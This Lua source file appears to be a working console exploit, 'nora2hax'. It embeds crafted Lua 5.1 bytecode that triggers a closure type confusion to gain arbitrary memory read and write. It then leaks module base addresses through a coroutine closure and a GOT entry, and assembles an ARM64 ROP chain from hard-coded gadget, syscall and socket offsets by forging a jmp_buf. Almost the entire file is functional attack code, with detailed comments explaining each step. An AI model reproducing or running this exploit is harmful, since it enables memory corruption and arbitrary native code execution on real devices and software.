local function fatal(err)
	local okfmt, msg = pcall(tostring, err)
	if not okfmt then
		msg = "<unprintable error>"
	end
	pcall(print, "[!] fatal: " .. msg)
	return msg
end

-- Converts a lua object to a string e.g. "table: 0x123456789"
-- gets only the 123456789 part as a hexadecimal number
local function addrof(o)
	local s = tostring(o)
	local i = s:find("0x")
	if not i then
		return nil
	end
	return tonumber(s:sub(i + 2), 16)
end

-- Converts an hex number e.g. 0x1234 to a floating point representation
-- that contains exactly the number e.g. 0x0000000000001234 so it's a way
-- to "write" and "read" values from the memory in an exact way
-- f2i 0x1234 to 0x0000000000001234
-- i2f 0x0000000000001234 to 0x1234
local function f2i(x)
	return x * 2 ^ -52 * 2 ^ -1022
end
local function i2f(x)
	return x * 2 ^ 52 * 2 ^ 1022
end

local offsets_main = {
	luaB_print = 0x139540,
	luaB_auxwrap = 0x13a460,
	-- luaD_rawrunprotected's setjmp return
	luaD_rawrunprotected_setjmp_va = 0x14036c,
	malloc = 0x25bbe0,
	free = 0x25bc30,
}

local offsets_sdk = {
	-- dynsym longjmp
	longjmp = 0x520ef4,
	-- ThreadManagerImplByHorizon::CreateThread
	-- x1=ThreadType*, x2=fn, w3=core; x0=(unused)
	thread_impl_create = 0x34ffd4,
	-- ThreadManagerImplByHorizon::StartThread
	-- x1=ThreadType* (reads [t+0x1b8])
	thread_impl_start = 0x3501f4,
	-- ldp x3,x4,[sp,#0x10]; ldp x1,x2,[sp],#0x20; ret
	thread_impl_pop_x1_x4 = 0x520fa4,
	-- svc #0x0a ; ret
	svc_exit_thread = 0x39fa14,
	-- svc #0x0b ; ret
	svc_sleep_thread = 0x39fa1c,
	-- svc #0x27 ; ret
	svc_output_debug_string = 0x39fb5c,
	-- svc #0x29 veneer: x0=&out, x1=type, x2=handle, x3=subid
	svc_get_info = 0x39fb6c,
	-- svc #0x21 ; ret   (calling thread's TLS message buffer, 0x100 bytes)
	svc_send_sync = 0x39fb14,
	-- svc #0x22 ; ret   (x0=buffer, x1=size, x2=handle; explicit RW page)
	svc_send_sync_user = 0x39fb1c,
	-- svc #0x18 ; ret   (x0=&out, x1=&handle, x2=n, x3=ns)
	svc_wait_sync = 0x39fabc,
	-- svc #0x16 ; ret   (x0=handle)
	svc_close_handle = 0x39faac,
	-- svc #0x34 ; ret   (x0=addr, x1=ArbitrationType, x2=value,
	-- x3=timeout_ns; 0 is an immediate TimedOut, negative is infinite)
	svc_wait_for_address = 0x39fbe4,
	-- svc #0x35 ; ret   (x0=addr, x1=SignalType, x2=value, x3=count;
	-- count <= 0 wakes every waiter)
	svc_signal_to_address = 0x39fbec,
	-- WaitLightEvent's svcWaitForAddress block, entered at mov x3,#-1:
	-- x19=addr, WaitIfEqual on value 1, infinite timeout, returns through
	-- a 0x40-byte caller frame.  g_call3_void zeroes x3, so this is the
	-- only reachable infinite-timeout wait in the SDK.
	wait_for_address_eq1_inf = 0x346300,
	-- mrs x0,tpidrro_el0 ; ret
	get_message_buffer_on_tls = 0x384fb0,
	-- nn::fs::detail lazy singleton (.bss)
	fs_singleton = 0xcc92c0,
	-- singleton +0x20: cached SharedPointer<IFileSystemProxy> payload
	fs_proxy = 0x020,
	-- singleton +0x3a8: session HandleAllocator free-list head
	fs_session_pool = 0x0538,
	-- proxy +0x18: CMIF domain object id
	fs_proxy_domain_id = 0x018,
	-- nn::fs::CommitSaveData
	fs_commit_save_data = 0x1bcee0,
	-- nn::os::GetThreadPriority(ThreadType const*)
	get_thread_priority = 0x348c30,
	-- nn::err::ShowApplicationError
	show_application_error = 0x15c090,
	-- nn::socket::*
	socket_initialize = 0x3886b0,
	socket_socket = 0x388260,
	socket_bind = 0x388150,
	socket_listen = 0x3881e0,
	socket_accept = 0x388130,
	socket_recv = 0x3880b0,
	socket_send = 0x3880f0,
	socket_close = 0x3882b0,
	socket_fcntl = 0x388390,
	socket_get_last_error = 0x3885a0,
}

-- The arb r/w needs 24 bytes for a w/r cycle, so the two GOT offsets after the
-- anchor get trashed; the symbols are lazy bound.  acos trashes atan2, atan. (destructive_read)
local got_anchors_sdk = {
	acos = { got = 0x3ebfd8, va = 0x529288 },
}

local gadgets = {
	-- ldr x0,[sp,#8]; ldp x29,x30,[sp,#0x10]; add sp,#0x20; ret
	g_load_x0 = 0x078400,
	-- ldp x29,x30,[sp,#0x10]; ldr x19,[sp,#8]; ldr d8,[sp],#0x20; ret
	g_load_x19 = 0x01e630,
	-- ldr x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_peek_x0_x19 = 0x156e38,
	-- str x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_store_x0_x19 = 0x0688b8,
	-- ldr x8,[x0,#8]; x0=[x19+0x50]; x3=0; x1,x2=[x19+0x20]; x4=0;
	-- blr x8; ldp x29,x30,[sp,#0x10]; mov w0,#0; ldp x20,x19,[sp],#0x20; ret
	g_call3_void = 0x0b9e60,
	-- ldp x8,x9,[sp]; ldp x29,x30,[sp,#0x20]; stp x8,x9,[x19];
	-- ldr x19,[sp,#0x10]; add sp,#0x30; ret
	g_load_x8_call5 = 0x244738,
	-- ldp x29, x30, [sp, #0x10] ; mov x1, x0 ; mov x0, x19 ; 
	-- ldp x20, x19, [sp], #0x20 ; br x1
	g_branch_x1 = 0x14438c,
	-- blr x8; ldp x29,x30,[sp,#0x10]; ldr x19,[sp],#0x20; ret
	g_blr_x8_keep_x0 = 0x002ea8,
}

local frames = {
	load_x0 = { x0 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	load_x19 = { x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	store = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	peek = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	call3 = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
}

local offsets_lua = {
	errorjmp = 0x0a8, -- lua_State.errorJmp
	errfunc = 0x0b0, -- lua_State.errfunc (the tag word of errorJmp)
	lj_b = 0x008, -- lua_longjmp.b (jmp_buf)
	lj_status = 0x140, -- lua_longjmp.status
	jmpbuf_scan = 0x130, -- scan bound inside lua_longjmp
	lua_errrun = 2, -- LUA_ERRRUN
}

-- Memory map for the scratch string's data area (0x4000 bytes).
local layout = {
	rop_backup = 0x000, -- pristine copy of the live jmp_buf
	rop_forged = 0x200, -- forged lua_longjmp (b at +8)
	rop_chain = 0x400,
	rop_chain_size = 0x300,
	rop_result = 0x700, -- x0 result cell of the call chain
	rop_marker = 0x710, -- g_store_x0_x19's extra [x19+0x10] write
	rop_scratch = 0x730, -- the call path's x19 scratch cell
	rop_ounce = 0x750, -- svcGetInfo out cell
	main_calls = 0xC00, -- g_call3_void descriptor pool
	main_calls_size = 0x400,
	arb_rw = 0x900, -- the arb r/w self-test cell
	slack = 0x10,
}

local function setup()
	-- We stop the garbagecollector temporarily to avoid cleaning pointers
	collectgarbage("stop")

	print("[*] nora2hax by alula")
	print("[*] sending big thanks to: Gezine, kurumuz, zecoxao, DialingSpoon")

	print("[+] setting up initial primitives...")
	
	local HELPER_READ =
		"\27\76\117\97\81\0\1\4\8\4\8\0\13\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\114\101\97\100\0\0\0\0\0\0\0\0\0\0\1\0\4\5\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\156\128\128\0\158\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\48\0\0\0\0\0\0\0\0\0\2\0\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\4\0\0\0\30\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HELPER_WRITE =
		"\27\76\117\97\81\0\1\4\8\4\8\0\14\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\119\114\105\116\101\0\0\0\0\0\0\0\0\0\0\2\0\6\6\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\192\0\128\0\156\64\0\1\30\0\128\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\64\112\48\119\0\0\0\0\0\0\0\0\0\2\1\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\8\0\0\0\30\0\128\0\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	--Check if they works
	local HR = assert(loadstring(HELPER_READ))
	local HW = assert(loadstring(HELPER_WRITE))

	-- Constructs a table 'T' whose internal structure makes 'T->lastfree'
	-- point directly to the beginning of 'node[1]', configured as a fake UpVal.
	local function prim(target)
		local T = {}
		-- In Lua 5.1, a table resized to 2 slots calculates the hash using the modulo:
    	-- divisor = ((sizenode - 1) | 1) = (1 | 1) = 1.
    	-- Any numeric key produces (hash % 1) = 0: all numbers collide on node[0].

    	-- 1. '0x1111' enters first and peacefully occupies node[0].
    	--    At this moment, T->lastfree points to the end of the array (&node[2]).
		T[f2i(0x1111)] = true
		-- 2. 'target' tries to go to node[0], but finds it occupied (forced collision).
    	--    Lua calls getfreepos(), which decrements T->lastfree from &node[2] to &node[1]
    	--    and allocates 'target' there.
    	--
    	-- Memory layout of node[1] (40 bytes on 64-bit):
    	--    +0x00 .. +0x0F (16B): Value (true) -> Acts as padding for the UpVal's CommonHeader.
    	--    +0x10 .. +0x17 (8B) : Key (target) -> Lies exactly where the VM looks for UpVal->v!
    	-- From this moment on, the 'T->lastfree' field of the table points to the beginning of node[1].
		T[f2i(target)] = true
		return T
	end
	
	-- The bytecode exploits a lack of type validation upon returning from an internal call:
	--
	--   PROTO helper_read(T):
	--     00: CLOSURE R2, p0        -> Instantiates p0 on the stack (in R2).
	--     01: capture upval[0] = R2 -> p0.upval[0] points to R2 (the p0 function itself / L->ci->func).
	--     02: capture upval[1] = R0 -> p0.upval[1] captures table T created by prim(target).
	--     03: CALL R2               -> Executes p0().
	--
	--   PROTO p0:
	--     00-01: Creates p1 sharing upval[0] (slot R2 of helper_read).
	--     02: GETUPVAL R1, B=1     -> Loads table T from upval[1] into register R1.
	--     03: MOVE R3, R1          -> Copies T to R3 (will become R0 in p1's stack frame).
	--     04: CALL R2              -> Calls p1(T).
	--
	--       |-> INSIDE p1:
	--       |     00: SETUPVAL R0, B=0 -> Writes table T into upval[0],
	--       |                           OVERWRITING L->ci->func of p0 with table T!
	--       |     01: RETURN           -> Returns to p0.
	--       |
	--       |-> UPON RETURNING TO p0 (reentry in lvm.c):
	--       |     1. Control flow intact: pc is restored via L->ci->savedpc,
	--       |        so the VM knows precisely to resume from instruction 05.
	--       |     2. Corrupted context: the VM reloads 'cl = &clvalue(L->ci->func)->l'
	--       |        without type-checking. The C pointer 'cl' (LClosure*) now points to Table T!
	--
	--     05: GETUPVAL R0, B=0     -> The VM executes setobj2s(L, R0, cl->upvals[0]->v):
	--                                 * Offset +0x28 in LClosure = upvals[0]
	--                                 * Offset +0x28 in Table    = T->lastfree (&node[1])
	--                                 * Adds +0x10 to read ->v: skips the 'true' and reads 'target'!
	--                                 * Dereferences 'target', reading the memory at that address into R0.
	--     06: RETURN R0            -> Returns the read value to helper_read.
	local function r64(target)
		local v = HR(prim(target))
		-- If the bytes read from 'target' contain a valid numeric tag, i2f extracts the raw 64 bits
		if type(v) == "number" then
			return i2f(v)
		end
		return nil, type(v)
	end

	--   PROTO helper_write(T, qword):
	--     00: CLOSURE R2, p0w        -> Instantiates sub-function p0w in register R2.
	--     01: capture upval[0] = R2  -> upval[0] points to R2 (the p0w closure / L->ci->func).
	--     02: capture upval[1] = R0  -> upval[1] captures table T (from prim(target)).
	--     03: MOVE R3, R1            -> Copies f2i(qword) from R1 to R3 (argument for p0w).
	--     04: CALL R2, 1 arg, 0 res  -> Executes p0w(f2i(qword)).
	--     05: RETURN 0 results
	--
	--   PROTO p0w(arg):
	--     * R0 = f2i(qword) (the 64-bit value to write).
	--     * upval[0] = points to slot R2 of helper_write.
	--     * upval[1] = points to table T.
	--
	--     00-01: Creates p1 sharing upval[0] (slot R2 of the parent).
	--     02: GETUPVAL R1, B=1       -> Loads table T from upval[1] into register R1.
	--     03: MOVE R3, R1            -> Moves T to R3 (becomes R0 in p1's stack frame).
	--     04: CALL R2, 1 arg, 0 res  -> Calls p1(T).
	--
	--       |-> INSIDE p1:
	--       |     00: SETUPVAL R0, B=0 -> Writes table T into upval[0],
	--       |                           OVERWRITING L->ci->func of p0w with table T!
	--       |     01: RETURN           -> Exits and returns to p0w.
	--       |
	--       |-> UPON RETURNING TO p0w (reentry in lvm.c):
	--       |     1. Program Counter: pc = L->ci->savedpc resumes cleanly from instruction 05.
	--       |     2. Corrupted closure context: the VM reloads 'cl = &clvalue(L->ci->func)->l'
	--       |        without type checks. The 'cl' pointer (LClosure*) now points to Table T!
	--
	--     05: SETUPVAL R0, B=0       -> In C, the following is executed:
	--                                   * UpVal *uv = cl->upvals[0];
	--                                     (Offset +0x28 in Table is T->lastfree, i.e., &node[1])
	--                                   * TValue *dest = uv->v;
	--                                     (Offset +0x10 in node[1] skips 'true' and reads 'target')
	--                                   * setobj(L, dest, &R0);
	--                                     Writes the bytes of f2i(qword) (from R0) directly to 'target'!
	--                                     (Also writes the LUA_TNUMBER tag at target + 0x08).
	--     06: RETURN 0 results
	local function w64(target, qword)
		HW(prim(target), f2i(qword))
	end

	-- Read data (e.g. a pointer) by writing forcefully type=number in the 8 byte
	-- after what we are reading.
	local function destructive_read(a)
		w64(a + 0x8, 3) -- tt = LUA_TNUMBER
		return r64(a)
	end
	-- Read a c function pointer (e.g. a GOT entry) by reading the 8 bytes after the function pointer
	local function save_cf(a)
		return destructive_read(a + 0x20)
	end

	-- Create a pinned scratchpad that the gc can't remove (_pinned)
	local scratch_str = string.rep("\0", 0x4000)
	_G._pinned_scratch = scratch_str

	-- Create a table to leak the string address (_pinned too)
	local box = { 0, 0 }
	_G._pinned_box = box
	-- Get the address of the table
	local box_addr = addrof(box)
	assert(box_addr, "addrof(box) failed")
	-- Prepare to read the address of the array part of the table (i need a number)
	w64(box_addr + 0x20, 3) -- tag slot for the array-pointer read below
	-- Read the address of the box array part
	local box_array = r64(box_addr + 0x18)
	assert(box_array and box_array ~= 0, "box has no array part")
	-- Save the string in the first slot of the heap
	box[1] = scratch_str
	-- Read the address in a destructive way (i need it to be a number)
	local scratch_ts = destructive_read(box_array)
	-- Now i have the string address the box is not needed so i fix the broken element
	box[1] = 0
	assert(scratch_ts and scratch_ts ~= 0, "scratch TString unreadable")
	-- The first 16+8 byte are a string header and metadata
	local heap = scratch_ts + 0x18 -- TString data area

	local rw_test = heap + layout.arb_rw
	w64(rw_test, 0x12676721372137)
	local sv = r64(rw_test)
	print("[+] testing arb rw")
	assert(sv == 0x12676721372137)

	print("[*] leaking module bases")

    -- Create a CClosure (real C function) 
	local anchor_co = coroutine.wrap(function() return true end)
    -- Get the address of the CClosure
	local anchor_addr = addrof(anchor_co)
	assert(anchor_addr, "addrof(coroutine.wrap) failed")
    -- Skip the header and read the c function pointer of the CClosure (luaB_auxwrap)
	local anchor_f = save_cf(anchor_addr)
	anchor_co = nil -- the damaged upvalue must never be traversed
	assert(anchor_f and anchor_f ~= 0, "anchor closure read failed")
    -- Leak the base by subtracting the known offset of luaB_auxwrap
	local main_base = anchor_f - offsets_main.luaB_auxwrap
	assert(main_base % 0x1000 == 0, "failed to leak main module base")

	print(string.format("[+] main @ 0x%x", main_base))
    
    -- We call the function to populate the GOT with the real address of acos
	math.acos(0) -- lazy bound!!!
    -- Offset of the GOT entry in respect to main 
	local anchor_func = got_anchors_sdk.acos
    -- Find the real address of the GOT entry by adding the main base 
	local sdk_got_addr = main_base + anchor_func.got
    -- Read the got entry to get the real address of acos in sdk
	local sdk_func = destructive_read(sdk_got_addr)
    -- Leak the sdk base by subtracting the known offset of acos
	local sdk_base = sdk_func - anchor_func.va
	assert(sdk_base % 0x1000 == 0, "failed to leak sdk module base")

	print(string.format("[+] sdk  @ 0x%x", sdk_base))

    --[[
        RUN_ROP - Coroutine and execution-context manager
        =================================================

        PURPOSE:
            Creates a dedicated Lua coroutine, retrieves its internal
            lua_State address and inspects the currently active protected
            execution context.

            Optionally captures the values stored in the associated
            jmp_buf and identifies the entries recognized as the saved
            program-continuation address and stack pointer.

            Once the context has been collected, two user-provided
            callbacks are invoked:

                opts.build(ctx) -> Preparation phase
                opts.fire(ctx)  -> Activation phase

        OVERALL FLOW:
            1. Create a new coroutine.
            2. Retrieve its lua_State address.
            3. Enter a protected call using pcall().
            4. Retrieve the active lua_longjmp pointer.
            5. Optionally inspect and record the jmp_buf contents.
            6. Identify the expected PC and SP entries.
            7. Invoke the build and fire callbacks.
    ]]

    local function run_rop(opts)

        -- Use the supplied options table, or create an empty one.
        opts = opts or {}

        -- Create a new coroutine.
        -- Each coroutine has its own Lua execution context (lua_State)
        -- while sharing the global Lua state with the other coroutines.
        local co = coroutine.create(function()

            -- Retrieve the current coroutine object and obtain its
            -- memory address through addrof().
            -- This address is treated as the coroutine's lua_State pointer.
            local L = addrof(coroutine.running())

            -- Create a context table to share information between
            -- the acquisition, build and activation phases.
            -- Initially, it only contains the lua_State address.
            local ctx = {
                L = L
            }

            -- Execute the following operations inside a protected Lua call.
            -- This establishes an active error-handling context managed
            -- internally by Lua through luaD_rawrunprotected().
            local ok, err = pcall(function()

                -- The errorJmp pointer is located at L + 0xA8.
                -- Its TValue-compatible tag position is immediately after
                -- the pointer, at L + 0xB0, which overlaps the errfunc field.
                --
                -- Temporarily set that adjacent field to LUA_TNUMBER (3)
                -- so that the underlying read primitive can interpret
                -- the errorJmp pointer as a numeric value.

                w64(L + offsets_lua.errfunc, 3)

                -- Read the currently active lua_longjmp pointer
                -- from the errorJmp field of lua_State.
                local live = r64(L + offsets_lua.errorjmp)

                -- Restore errfunc to its expected zero value.
                -- Note that w64() also has adjacent-memory side effects,
                -- as each helper write stores a TValue.
                w64(L + offsets_lua.errfunc, 0)

                -- Store the active lua_longjmp address in the shared context.
                ctx.live = live

                -- Abort if no active error-handling context was found.
                assert(live, "no live errorJmp")


                -- Optional jmp_buf acquisition.
                -- This block is only executed when capture_jmpbuf is enabled.
                if opts.capture_jmpbuf then

                    -- Store the 64-bit values read from the jmp_buf.
                    -- Each entry is indexed by its corresponding byte offset.
                    local slots = {}

                    -- Scan the assumed jmp_buf region in 8-byte steps,
                    -- starting from the highest offset and moving backwards.
                    --
                    -- The descending order is intentional:
                    -- helper writes also modify adjacent type-tag bytes,
                    -- so processing higher addresses first helps ensure
                    -- that subsequent writes affect already-read locations.
                    for off = offsets_lua.jmpbuf_scan, 0, -8 do

                        -- Calculate the address of the current 64-bit slot.
                        -- lj_b identifies the beginning of the jmp_buf
                        -- inside the lua_longjmp structure.
                        local slot = live + offsets_lua.lj_b + off

                        -- Set the adjacent TValue tag to LUA_TNUMBER.
                        -- This prepares the current slot for numeric reading.
                        --
                        -- Important: the highest scanned slot is adjacent
                        -- to lua_longjmp.status, so this operation temporarily
                        -- overlaps that field in the expected layout.
                        w64(slot + 8, 3)

                        -- Read the current 64-bit value and save it
                        -- using its original offset as the table key.
                        slots[off] = r64(slot)

                        -- Ensure that the memory read returned a valid value.
                        assert(slots[off] ~= nil, "jmp_buf read failed")
                    end

                    -- Restore errfunc to zero after the buffer scan.
                    w64(L + offsets_lua.errfunc, 0)


                    -- These variables will hold the offsets of the
                    -- entries identified as the saved PC and SP.
                    local pc_off, sp_off

                    -- Examine the previously captured values.
                    -- No additional jmp_buf reads are performed here.
                    for off = offsets_lua.jmpbuf_scan, 0, -8 do

                        -- Identify the entry matching the expected
                        -- setjmp continuation address inside
                        -- luaD_rawrunprotected().
                        --
                        -- The expected address is calculated using
                        -- the main module base and its build-specific RVA.
                        if slots[off] ==
                            main_base + offsets_main.luaD_rawrunprotected_setjmp_va then

                            pc_off = off
                        end

                        -- Identify the entry matching the expected
                        -- stack-pointer value for this lua_longjmp frame.
                        --
                        -- live - 8 is a layout-specific assumption based
                        -- on the expected stack-frame organization.
                        if slots[off] == live - 8 then
                            sp_off = off
                        end
                    end

                    -- Ensure that both expected entries were identified.
                    -- Otherwise, the jmp_buf layout does not match
                    -- the assumptions made by this implementation.
                    assert(pc_off and sp_off, "unrecognised jmp_buf layout")

                    -- Store the captured values and identified offsets
                    -- in the shared context for subsequent callbacks.
                    ctx.slots, ctx.pc_off, ctx.sp_off =
                        slots, pc_off, sp_off
                end


                -- BUILD PHASE:
                -- Invoke the caller-provided preparation callback.
                -- It receives the context collected above.
                opts.build(ctx)

                -- ACTIVATION PHASE:
                -- Invoke the caller-provided activation callback.
                -- In this implementation, this is typically fire8().
                opts.fire(ctx)

            end)
        end)

        -- Start/resume the newly created coroutine.
        -- Returns the coroutine execution status and any returned values.
        return coroutine.resume(co)
    end

	local function new_emitter(chain_base, desc_base, desc_end, chain_end, scratch)
		local E = {
			cursor = chain_base,
			desc = desc_base,
			desc_end = desc_end,
			chain_end = chain_end,
			scratch = scratch or (heap + layout.rop_scratch),
			pending = nil,
			words = {}
		}
		-- Every helper write stores a TValue: the eight-byte value plus a
		-- four-byte tag at +8, so a write spills into the cell above it.  Frames
		-- are therefore recorded and flushed in ascending address order, which
		-- lets each frame's own write correct the spill of the frame below it.

        -- Add a pair address/value to the list of words to be written. No writes are done
		local function put(addr, val)
			local w = E.words
			w[#w + 1] = { addr, val }
		end

        -- Find the address of a code by using only the offset
		local function code(va)
			return main_base + va
		end
        -- If there's a pending frame, add it to the list of words to be written with the value of va
		function E:patch(va)
			if self.pending then
				put(self.pending, va)
			end
		end

		-- Prepares a frame for loading a value into X0.
		function E:g0(v)
			self:patch(code(gadgets.g_load_x0))
			local f = frames.load_x0
			local b = self.cursor
			put(b + f.x0, v or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- Prepares a frame for loading a value into X19.
		function E:g1(v)
			self:patch(code(gadgets.g_load_x19))
			local f = frames.load_x19
			local b = self.cursor
			put(b + f.x19, v or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- Prepares the register-restoration frame associated with a store operation.
		function E:g2(v20, v19)
			self:patch(code(gadgets.g_store_x0_x19))
			local f = frames.store
			local b = self.cursor
			put(b + f.x20, v20 or 0)
			put(b + f.x19, v19 or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- Reads a memory value and transfers it to another memory location.
		function E:peek(src, dst)
			self:g1(src)
			self:patch(code(gadgets.g_peek_x0_x19))
			local f = frames.peek
			local b = self.cursor
			put(b + f.x20, 0)
			put(b + f.x19, 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
			self:g1(dst)
			self:g2(0, 0)
		end
		-- Prepares a native function call using three arguments.
		function E:call3(target, x0v, x1v, x2v)
			local t = self.desc
			local a = t + 0x40
			if t + 0x100 > self.desc_end then
				error("rop descriptor pool overflow", 0)
			end
			self.desc = t + 0x100
			put(t + 8, target)
			put(a + 0x20, x1v or 0)
			put(a + 0x28, x2v or 0)
			put(a + 0x50, x0v or 0)
			self:g0(t)
			self:g1(a)
			self:patch(code(gadgets.g_call3_void))
			local f = frames.call3
			local b = self.cursor
			put(b + f.x20, 0)
			put(b + f.x19, 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end

		-- Prepares a native function call with up to five arguments
		-- and preserves its return value in a memory cell.
		function E:call_native(target, a0, a1, a2, a3, a4, result_cell)
			local f0 = frames.load_x19
			self:patch(code(gadgets.g_load_x19))
			local b0 = self.cursor
			put(b0 + f0.x19, self.scratch)
			put(b0 + f0.x29, 0)
			put(b0 + f0.x30, code(gadgets.g_load_x8_call5))
			self.cursor = b0 + f0.size
			-- Here x19 = scratch, x30 = g_load_x8_call5

			-- LDP X8, X9, [SP]
			-- LDP X29, X30, [SP, #0x20]
            -- STP X8, X9, [X19]
			-- LDR X19, [SP, #0x10]
			-- ADD SP, SP, #0x30
			-- RET
			local b1 = self.cursor
			put(b1, 0) 			 -- [old] put(b1, target)
			-- 0 in x9
			put(b1 + 8, target)  -- [old] put(b1 + 8, 0) 
			-- 0 in x9
			-- Before overwriting x19, we store x8 in the scratch
			put(b1 + 0x10, a0 or 0)
			-- Now x19 = a0
			put(b1 + 0x18, 0) -- Unknown, unused
			put(b1 + 0x20, 0) -- x29
			put(b1 + 0x28, code(gadgets.g_load_x0)) -- x30
			self.cursor = b1 + 0x30
			-- Here x19 = a0, x8 = target, x30 = g_load_x0
			-- [old] In the old version x8 and x9 were swapped

			-- New: we need to prepare a load to x0 with the sdk function
			local f2 = frames.load_x0
			local b2 = self.cursor
			put(b2 + f2.x0, sdk_base + offsets_sdk.thread_impl_pop_x1_x4)
			put(b2 + f2.x29, 0)
			put(b2 + f2.x30, code(gadgets.g_branch_x1))
			self.cursor = b2 + f2.size
			-- Here x19 = a0, x8 = target, x30 = g_branch_x1, x0 = thread_impl_pop_x1_x4

			-- New: (g_branch_x1)
			-- LDP X29, X30, [SP, #0x10]
			-- x29 useless, we load the next gadget in x30
			-- MOV X1, X0
			-- thread_impl_pop_x1_x4 is now in x1
			-- MOV X0, X19
			-- a0 in x0
			-- LDP X20, X19, [SP], #0x20
			-- both useless so we fill with 0
			-- BR X1
			-- jump to next gadget
			local b3 = self.cursor
			put(b3, 0) 
			-- x20 useless
			put(b3 + 8, 0)
			-- x19 useless now (i already copied a0 in x0)
			put(b3 + 0x10, 0)
			-- x29 is useless
			put(b3 + 0x18, code(gadgets.g_blr_x8_keep_x0))
			-- next gadget in x30
			self.cursor = b3 + 0x20
			-- Here x0 = a0, x1 = thread_impl_pop_x1_x4, x8 = target, x30 = g_blr_x8_keep_x0

			--[[ OLD
			   LDR X2, [SP, #8]
			   We load thread impl_pop_x1_x4
			   LDP X29, X30, [SP, #0x10]
			   x29 useless x30 next gadget
               MOV X1, X0
			   useless
			   MOV X0, X19
			   we move x19 to x0 moving a0 to the correct register for the call
			   LDR X19, [SP], #0x20
			   useless so we just put 0 in x19
			   BR X2
			   we run the sdk function

			local b2 = self.cursor
			put(b2, 0) -- new x19 (unused by the x1..x4 restore)
			put(b2 + 8, sdk_base + offsets_sdk.thread_impl_pop_x1_x4)
			put(b2 + 0x10, 0)
			put(b2 + 0x18, code(gadgets.g_blr_x8_keep_x0))
			self.cursor = b2 + 0x20
			-- x8 = target, scratch = target, x0 = a0, x2 = thread_impl_pop_x1_x4, x30 = g_blr_x8_keep_x0
			]]

			-- thread_impl_pop_x1_x4 frame
			local b4 = self.cursor
			put(b4, a1 or 0)
			-- a1 in x1
			put(b4 + 8, a2 or 0)
			-- a2 in x2
			put(b4 + 0x10, a3 or 0)
			-- a3 in x3
			put(b4 + 0x18, a4 or 0)
			-- a4 in x4
			self.cursor = b4 + 0x20
			-- we now launch g_blr_x8_keep_x0
			-- Here x0 = a0, x1 = a1, x2 = a2, x3 = a3, x4 = a4, x8 = target, x30 = g_blr_x8_keep_x0
			

			local b5 = self.cursor
			put(b5, result_cell or (heap + layout.rop_result))
			-- x19 will point to result_cell
			put(b5 + 8, 0) -- Unused
			put(b5 + 0x10, 0)
			-- x29 = 0 useless
			put(b5 + 0x18, code(gadgets.g_store_x0_x19))
			-- x30 = g_store_x0_x19 next gadget
			self.cursor = b5 + 0x20
			-- Here x0 = function result, x19 = result_cell, x30 = g_store_x0_x19
			
			-- we now store x0 (the result of the function) in x19 (result_cell)
			local f6 = frames.store
			local b6 = self.cursor
			put(b6 + f6.x20, 0)
			-- x20 = 0 useless
			put(b6 + f6.x19, 0)
			-- x19 = 0 useless
			put(b6 + f6.x29, 0)
			-- x29 = 0 useless
			self.cursor = b6 + f6.size
			self.pending = b6 + f6.x30
			-- Here we use pending to prepare the next gadget to be used
		end

		-- Sorts and performs all queued memory writes, then clears the queue.
		function E:flush()
			table.sort(self.words, function(x, y) return x[1] < y[1] end)
			for i = 1, #self.words do
				w64(self.words[i][1], self.words[i][2])
			end
			self.words = {}
		end
		return E
	end

	-- Where we will save the original jmp_buf to return to
	local rop_backup = heap + layout.rop_backup
	-- Where we will forge a jmp_buf to enter the ROP chain
	local rop_forged = heap + layout.rop_forged
	-- Where the ROP chain is stored (the one prepared by the emitter)
	local rop_chain = heap + layout.rop_chain
	-- The longjmp_b offset is used to locate the jmp_buf within the lua_longjmp structure
	local longjmp_b = offsets_lua.lj_b

	-- Define the default memory layout used by the emitter.
	local main_area = {
		-- Start of the chain memory area.
		chain = rop_chain,
		-- Set the chain boundary before the result cell, leaving a safety margin.
		chain_end = heap + layout.rop_result - layout.slack,
		-- Start of the call descriptor area.
		desc = heap + layout.main_calls,
		-- Define the upper boundary of the descriptor area.
		desc_end = heap + layout.main_calls + layout.main_calls_size
	}

